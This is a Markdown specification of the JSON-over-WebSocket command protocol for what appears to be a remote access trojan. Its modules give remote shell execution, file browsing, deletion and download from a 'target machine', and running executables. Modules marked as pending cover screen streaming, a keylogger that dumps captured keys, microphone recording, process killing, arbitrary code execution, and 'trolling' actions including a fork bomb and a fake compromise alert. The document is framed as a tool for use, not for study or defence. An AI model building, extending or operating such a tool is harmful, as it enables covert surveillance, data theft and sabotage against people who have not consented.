# Client JSON API Scheme

This document describes the JSON API scheme used for interacting with the client. All messages must be in JSON format and sent via WebSocket.

## General Command Structure

Each command sent to the client must adhere to the following structure:

```json
{
  "module": "MODULE_NAME",
  "args": {
    /* Arguments specific to the module */
  }
}
```

- `module`: A string identifying the target module to handle the command.
- `args`: A JSON object containing the parameters required for the module's operation.

---

## Module Definitions

### 1. Remote Shell (`RSH`)

Executes shell commands on the target machine.

| `args` Key | Type   | Required? | Description                                                                                       |
| :--------- | :----- | :-------- | :------------------------------------------------------------------------------------------------ |
| `command`  | String | Yes       | The command to be executed.                                                                       |
| `shell`    | String | No        | The shell to use. Can be `"cmd"`, `"powershell"`, `"sh"`, or `"bash"`. Defaults depend on the OS. |

**Example:**

```json
{
  "module": "RSH",
  "args": {
    "command": "Get-NetIPAddress -AddressFamily IPv4",
    "shell": "powershell"
  }
}
```

---

### 2. File System (`FS`)

Manages files and directories on the target machine.

| `args` Key  | Type   | Required?   | Description                                           |
| :---------- | :----- | :---------- | :---------------------------------------------------- |
| `operation` | String | Yes         | Action: `"GET"`, `"DEL"`, `"MOV"`, `"DOWN"`, `"RUN"`. |
| `path`      | String | Yes         | The primary path for the operation.                   |
| `to`        | String | For `"MOV"` | The destination path for a move/rename operation.     |

**Operations Description:**

- `GET`: Reads a file's content or gets a list of files and folders in a directory.
- `DEL`: Deletes a file or directory (recursively).
- `MOV`: Moves or renames a file/directory.
- `DOWN`: Downloads a file or folder (recursively) to the host machine.
- `RUN`: Runs an executable file.

**Example (List files):**

```json
{
  "module": "FS",
  "args": {
    "operation": "GET",
    "path": "C:\\Users\\Public\\Documents"
  }
}
```

---

### 3. Remote Screen (`RS`)

Handles screen capture and streaming. _(Note: Schema is based on intended functionality; implementation is pending)_

| `args` Key | Type   | Required?            | Description                                                                                     |
| :--------- | :----- | :------------------- | :---------------------------------------------------------------------------------------------- |
| `action`   | String | Yes                  | `"screenshot"` for a single frame, `"stream_start"` to begin streaming, `"stream_stop"` to end. |
| `fps`      | Number | For `"stream_start"` | Frames per second for the stream.                                                               |

**Example (Take screenshot):**

```json
{
  "module": "RS",
  "args": {
    "action": "screenshot"
  }
}
```

---

### 4. Task Manager (`TM`)

Manages processes on the target machine. _(Note: Schema is based on intended functionality; implementation is pending)_

| `args` Key | Type   | Required?    | Description                                                     |
| :--------- | :----- | :----------- | :-------------------------------------------------------------- |
| `action`   | String | Yes          | `"list"` to get all processes, `"kill"` to terminate a process. |
| `pid`      | Number | For `"kill"` | The Process ID (PID) to terminate.                              |

**Example (Kill a process):**

```json
{
  "module": "TM",
  "args": {
    "action": "kill",
    "pid": 4125
  }
}
```

---

### 5. Trolling (`TRL`)

Performs various "fun" actions on the target. _(Note: Schema is based on intended functionality; implementation is pending)_

| `args` Key | Type   | Required?                              | Description                                                            |
| :--------- | :----- | :------------------------------------- | :--------------------------------------------------------------------- |
| `action`   | String | Yes                                    | `"message_box"`, `"open_link"`, `"set_clipboard"`, `"fork_bomb"`, etc. |
| `title`    | String | For `"message_box"`                    | The title of the message box window.                                   |
| `text`     | String | For `"message_box"`, `"set_clipboard"` | The content for the message or clipboard.                              |
| `url`      | String | For `"open_link"`                      | The URL to open in the default browser.                                |

**Example (Show message box):**

```json
{
  "module": "TRL",
  "args": {
    "action": "message_box",
    "title": "System Security Alert",
    "text": "Your system has been compromised."
  }
}
```

---

### 6. Keylogger (`KL`)

Controls the keylogging functionality. _(Note: Schema is based on intended functionality; implementation is pending)_

| `args` Key | Type   | Required? | Description                                                           |
| :--------- | :----- | :-------- | :-------------------------------------------------------------------- |
| `action`   | String | Yes       | `"start"`, `"stop"`, or `"dump"` (to send captured keys to the host). |

**Example (Get all logged keys):**

```json
{
  "module": "KL",
  "args": {
    "action": "dump"
  }
}
```

---

### 7. Chat (`CH`)

Manages a two-way chat with the target machine. _(Note: Schema is based on intended functionality; implementation is pending)_

| `args` Key | Type   | Required?    | Description                                           |
| :--------- | :----- | :----------- | :---------------------------------------------------- |
| `action`   | String | Yes          | `"start"`, `"send"`, `"stop"`.                        |
| `message`  | String | For `"send"` | The message text to send to the target's chat window. |

**Example (Send a message):**

```json
{
  "module": "CH",
  "args": {
    "action": "send",
    "message": "Can you hear me?"
  }
}
```

---

### 8. Other Modules (Not Yet Implemented)

The following modules are defined in the router but their implementation is pending.

| Module | Name                  | Intended Purpose                                              |
| :----- | :-------------------- | :------------------------------------------------------------ |
| `AD`   | Audio                 | Record and stream audio from the microphone.                  |
| `RCE`  | Remote Code Execution | Execute arbitrary code (e.g., scripts) on the target machine. |
